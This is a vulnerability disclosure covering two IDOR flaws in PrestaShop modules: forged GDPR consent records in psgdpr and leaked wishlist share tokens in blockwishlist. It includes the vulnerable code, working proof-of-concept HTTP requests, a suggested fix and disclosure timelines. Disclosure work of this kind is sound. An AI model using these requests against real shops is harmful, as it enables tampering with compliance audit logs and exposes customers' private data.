https://github.com/prestashop/prestashop

## Finding 1: IDOR - Authenticated customers can forge GDPR consent records for arbitrary customers

### Summary

I found an Insecure Direct Object Reference in the psgdpr (Official GDPR Compliance) module version 1.4.3 (latest) that lets any authenticated customer insert GDPR consent audit log entries attributed to any other customer.

The vulnerability is in controllers/front/FrontAjaxGdpr.php. The file handles action=AddLog POST requests and accepts id_customer from user input. It then validates the caller using sha1 of the logged-in customer's own secure_key. Because the id_customer used in the database insert is taken from the request rather than from the session, the token check authenticates the caller but does not scope the operation to the caller's own account:

    $id_customer = (int) Tools::getValue('id_customer');   // caller-controlled
    $customer_token = Tools::getValue('customer_token');

    if ($customer->isLogged() === true) {
        $token = sha1($customer->secure_key);
        if (!isset($customer_token) || $customer_token == $token) {
            GDPRLog::addLog($id_customer, 'consent', $id_module);
        }
    }

A caller authenticated as customer A can pass id_customer = B and insert a "Consent confirmation" record into ps_psgdpr_log attributed to customer B. The record appears in the admin back-office GDPR activity log with the victim's real name and no visible distinction from a legitimate entry.

PoC
Prerequisites: attacker must hold a valid customer account.

Step 1 -- Attacker authenticates and obtains sha1 of their own secure_key. The value is exposed in the psgdpr_token query parameter of the CSV/PDF export links shown on the GDPR personal data page after login.

Step 2 -- Attacker submits forged consent for victim (id_customer=3):

    POST /module/psgdpr/FrontAjaxGdpr
    Cookie: <attacker session>

    action=AddLog&id_customer=3&customer_token=<sha1(attacker_secure_key)>&id_module=0

Response: HTTP 200, empty body.

Step 3 -- Forged entry appears in admin GDPR > Customer activity list:

    Client name: Victim User
    Type of request: Consent confirmation
    Submission date: 2026-05-17 02:48:06

The record is indistinguishable from a real consent confirmation. An attacker can enumerate all integer customer IDs to flood the audit log with forged entries.

I verified this against PrestaShop 9.1.1 with psgdpr 1.4.3 on a local Docker instance.

### Disclosure

 - 17 May 2026 - reported via email
 - 1 June 2026 - report acknowledged
 - 30 June 2026 - followed up on updates
 - 26 August 2026 - 3rd email attempt
 - 26 August 2026 - automated response
 - 16 September 2026 - disclosed


## Finding 2: blockwishlist IDOR: Wishlist Share Token Disclosure via Missing Authorization Check

### Summary

I'm reporting an Insecure Direct Object Reference in the blockwishlist module (version 3.0.2, latest) that lets any authenticated customer retrieve the private share token of another customer's wishlist without owning it.

The vulnerability is in controllers/front/action.php. The file routes POST requests to internal action methods by name. Every write operation -- adding products, renaming, deleting -- calls assertWriteAccess() to verify ownership. The getUrlByIdWishListAction method does not:

    private function getUrlByIdWishListAction($params)
    {
        $wishlist = new WishList($params['idWishList']);

        return $this->ajaxRender(
            json_encode([
                'status' => 'true',
                'url' => $this->context->link->getModuleLink(
                    'blockwishlist', 'view', ['token' => $wishlist->token]
                ),
            ])
        );
    }

The method accepts an arbitrary wishlist ID from user input, loads the corresponding wishlist, and returns its token in the JSON response. That token is the only credential granting read access to a wishlist when accessed via the share URL.

PoC
Prerequisites: attacker must hold a valid customer account.

Step 1 -- Victim creates a wishlist (normal use):

    POST /module/blockwishlist/action
    Cookie: <victim session>
    action=createNewWishList&params[name]=MySecretWishlist

Step 2 -- Attacker calls getUrlByIdWishList with victim's wishlist ID:

    POST /module/blockwishlist/action
    Cookie: <attacker session>
    action=getUrlByIdWishList&params[idWishList]=1

Response:

    {"status":"true","url":"http://shop/module/blockwishlist/view?token=CD8BECEDD8BEF433"}

No ownership check is performed. The token is returned in plaintext.

Step 3 -- Attacker views victim's wishlist (no login required):

    GET /module/blockwishlist/view?token=CD8BECEDD8BEF433

The victim's wishlist name and saved products are displayed.

I verified this against PrestaShop 9.1.1 with blockwishlist 3.0.2 on a local Docker instance.

Impact

Any authenticated customer can enumerate wishlist IDs and collect share tokens for all wishlists on the shop. This gives read access to the saved product lists of every other customer, disclosing their shopping intent. The fix is to add assertWriteAccess($wishlist) at the top of getUrlByIdWishListAction, matching the pattern used by every other action in the file.


### Disclosure
 - 17 May 2026 - reported via email
 - 6 June 2026 - followed up on updates
 - 6 June 2026 - email acknowledged
 - 10 June 2026 - report acknowledged
 - 16 September 2026 - disclosed
